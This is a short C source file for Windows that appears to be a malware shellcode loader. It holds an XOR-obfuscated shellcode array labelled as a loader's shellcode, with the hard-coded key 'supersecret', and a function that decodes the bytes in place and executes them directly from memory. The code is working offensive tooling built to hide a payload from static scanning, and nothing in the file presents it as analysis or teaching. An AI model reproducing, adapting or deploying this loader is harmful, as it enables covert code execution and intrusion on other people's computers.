#include "windows.h"

// Contains shellcode of loader
char buf[]  __attribute__((section(".text"))) = "\x8f\x3d\xf3\x81\x82\x9b\xa5\x63\x72\x65\x35\x22\x34\x20\x37\x23\x25\x2d\x52\xa0\x0\x3c\xf8\x27\x10\x2d\xf9\x21\x7d\x2b\xf9\x37\x54\x3b\xfe\x2\x35\x3a\x7c\xd2\x29\x38\x28\x45\xba\x3d\x41\xa5\xde\x4f\x4\x1f\x70\x49\x54\x32\xb4\xb9\x68\x33\x72\xa4\x81\x9f\x37\x35\x22\x3d\xfb\x37\x52\xf8\x27\x5f\x3a\x64\xa4\xf8\xf5\xf8\x65\x72\x73\x2d\xe6\xb2\x11\x13\x3b\x74\xa0\x35\xf9\x3b\x7d\x27\xf9\x25\x54\x3a\x74\xa0\x86\x24\x3b\x9a\xaa\x33\xee\x40\xfb\x3d\x71\xb3\x3f\x42\xac\x2b\x43\xa5\xd8\x32\xb4\xb9\x68\x33\x72\xa4\x5b\x92\x10\x85\x3f\x76\x3c\x41\x7a\x36\x5c\xb2\x7\xbd\x2c\x37\xfe\x30\x41\x3b\x72\xb5\x5\x33\xee\x78\x3b\x31\xfb\x25\x6e\x3a\x64\xb3\x33\xee\x70\xfb\x3d\x71\xb5\x33\x2b\x24\x3b\x2c\x3c\x2e\x32\x2d\x31\x3c\x33\x29\x2d\xe0\x9e\x45\x35\x21\x8a\x90\x3d\x33\x2a\x3f\x2b\xf9\x77\x9d\x24\x8a\x8f\x9a\x2f\x3a\xdb\x14\x1\x57\x2b\x40\x47\x70\x65\x33\x25\x2c\xea\x94\x2d\xf5\x9f\xd5\x71\x65\x72\x3a\xec\x86\x3b\xd9\x76\x73\x74\xcb\x6f\x72\x73\x6e\x22\x26\x2c\xfd\x97\x39\xf9\x94\x33\xc9\x29\x14\x54\x62\x8b\xa6\x39\xf9\x8f\x1a\x72\x64\x63\x72\x3c\x35\xc9\x5c\xf0\xe\x72\x8c\xb0\x33\x22\x28\x45\xba\x38\x41\xa5\x3a\x8c\xa5\x2b\xfb\xa7\x3c\x8c\xb5\x38\xec\xb3\x32\xdf\x89\x7d\xba\x94\x8c\xa0\x38\xec\xb5\x19\x75\x22\x2a\x29\xfd\x91\x3d\xf9\x9c\x33\xc9\xfc\xc6\x6\x4\x8b\xa6\x3d\xf1\xa1\x32\x71\x65\x63\x3b\xdd\x17\x1e\x11\x70\x65\x72\x73\x65\x22\x22\x24\x24\x3b\xfc\x92\x32\x25\x24\x28\x52\xb2\xf\x79\x2a\x34\x20\x87\x8e\x15\xa2\x27\x56\x31\x75\x72\x3d\xfd\x21\x56\x6b\xa3\x63\x1a\x2d\xfd\x95\x23\x20\x24\x22\x32\x35\x22\x22\x2c\x8b\xb3\x34\x20\x2c\x8d\xbb\x28\xea\xb3\x29\xfd\xb2\x34\xca\x1c\xbe\x4c\xe3\x9c\xa7\x2d\x45\xa1\x3d\x8f\xaf\xf9\x7d\x24\xd9\x7a\xe2\x69\x13\x8a\xa5\xde\x82\xc6\xc7\x35\x33\xdf\xd2\xe6\xc8\xed\x9a\xa7\x3b\xe6\xa7\x5a\x59\x72\xf\x7f\xf0\x9e\x92\x6\x60\xd8\x35\x76\x6\x1c\x1f\x70\x3c\x33\xfa\xbf\x9c\xa7\x65";
char key[]  __attribute__((section(".text"))) = "supersecret";

void go() 
{
    int j = 0;
    for (int i = 0; i < sizeof buf; i++) 
    {
        if (j == sizeof key - 1) j = 0;

        buf[i] = buf[i] ^ key[j];
        j++;
    }

    (*(void(*)())(&buf))();

}

